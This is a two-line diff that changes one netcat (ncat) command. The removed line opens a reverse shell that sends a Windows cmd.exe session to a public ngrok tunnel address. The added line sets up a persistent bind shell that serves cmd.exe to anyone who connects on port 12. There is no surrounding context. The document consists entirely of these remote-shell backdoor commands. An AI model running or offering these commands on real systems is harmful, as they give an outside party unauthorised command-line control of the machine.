@@ -1,1 +1,1 @@
-ncat 0.tcp.eu.ngrok.io 16773 -e cmd.exe
+ncat -lvk 12 -e cmd.exe
